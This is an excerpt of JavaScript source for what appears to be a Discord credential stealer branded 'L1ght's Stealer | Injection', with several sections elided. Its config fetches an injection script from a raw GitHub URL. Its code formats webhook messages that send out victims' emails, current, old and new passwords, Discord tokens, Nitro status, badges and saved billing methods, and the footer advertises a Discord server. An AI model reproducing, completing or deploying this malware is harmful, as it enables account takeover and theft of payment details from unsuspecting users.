...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'L1ght's Stealer | Injection', 
  embed_icon: 'https://cdn.discordapp.com/attachments/1163859340365680640/1177181034001993808/static.png?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&'.replace(/ /g, '%20'), 
  embed_color: 0x812118, 
  injection_url: 'https://raw.githubusercontent.com/negawaatt/main/main/main/injection.js', 
  /**
...
const getBilling = async (token) => {
  ...
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '<:creditcard:1164988676992929864> ';
          break;
        case 2:
          billing += '<:paypal:1164989531909521520> ';
          break;
      }
    }
  });
    ...
    embeds: [
      {
        ...
        fields: [
          {
            ...
            value: `<:emaill:1165001953525375077> Email: **${email}** - <:lockk:1165002404333371503> Password: **${password}**`,
            inline: false,
          },
          {
            name: '**Discord Information**',
            value: `<:arroww:1165002847612579860> Nitro Type: **${nitro}**\n<a:blackhypesquad:1165003350702575717> Badges: **${badges}**\n<:creditcard:1164988676992929864> Billing: **${billing}**`,
            inline: false,
          },
          {
            name: '<:hackerblack:1165203049145438228> **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        ...
        footer: {
            text: 'L1ghts Injection | discord.gg/hSP5cK3Kqw',
            icon_url: "https://cdn.discordapp.com/attachments/1163859340365680640/1177181034001993808/static.png?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&"
        },
      },
    ],
  };
        ...
        fields: [
          {
            ...
            value: `<:emaill:1165001953525375077> Email: **${json.email}**\n<:lockk:1165002404333371503> Old Password: **${oldpassword}**\n<:lockk:1165002404333371503> New Password: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Discord Information**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Email Changed**',
            value: `<:emaill:1165001953525375077> New Email: **${email}**\n<:lockk:1165002404333371503> Password: **${password}**`,
            inline: true,
          },
          {
            name: '**Discord Information**',
